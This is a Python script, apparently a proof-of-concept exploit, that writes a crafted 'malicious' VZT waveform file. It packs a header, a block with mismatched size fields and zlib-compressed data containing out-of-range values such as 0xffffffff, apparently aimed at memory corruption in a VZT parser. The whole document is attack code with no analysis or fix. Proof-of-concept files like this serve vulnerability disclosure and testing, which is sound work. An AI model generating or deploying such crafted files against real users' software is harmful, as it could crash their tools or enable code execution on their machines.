#!/usr/bin/env python3

import struct
import zlib
import sys

def create_malicious_vzt(filename):
    # Basic VZT header
    data = bytearray()
    data += struct.pack('>H', 0x4b5a)  # ID
    data += struct.pack('>H', 1)       # Version
    data += struct.pack('B', 1)        # Granule size
    
    # Set up malicious values
    data += struct.pack('>I', 1)       # numfacs
    data += struct.pack('>I', 0)       # numfacbytes
    data += struct.pack('>I', 10)      # longestname
    data += struct.pack('>I', 0)       # zfacnamesize
    data += struct.pack('>I', 100)     # zfacname_predec_size
    data += struct.pack('>I', 0)       # zfacgeometrysize
    data += struct.pack('B', 0)        # timescale
    
    # Create malicious block
    block_data = bytearray()
    block_data += struct.pack('>I', 100)  # uncompressed_siz
    block_data += struct.pack('>I', 50)   # compressed_siz
    block_data += struct.pack('>Q', 0)    # start
    block_data += struct.pack('>Q', 100)  # end
    
    # Craft malicious compressed data
    malicious_data = bytearray()
    malicious_data += struct.pack('B', 1)  # num_time_ticks (varint)
    malicious_data += struct.pack('B', 1)  # num_sections (varint)
    malicious_data += struct.pack('B', 1)  # num_dict_entries (varint)
    
    # Pad to 4-byte boundary
    malicious_data += bytes([0]*3)
    
    # Craft malicious change_dict values
    malicious_data += struct.pack('>I', 0xffffffff)  # val_dict[0]
    
    # Compress the malicious data
    compressed_data = zlib.compress(malicious_data)
    
    # Add to block
    block_data += compressed_data
    
    # Add block to main data
    data += block_data
    
    # Write to file
    with open(filename, 'wb') as f:
        f.write(data)
    
    print(f"Created malicious VZT file: {filename}")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <output_file.vzt>")
        sys.exit(1)
    
    create_malicious_vzt(sys.argv[1])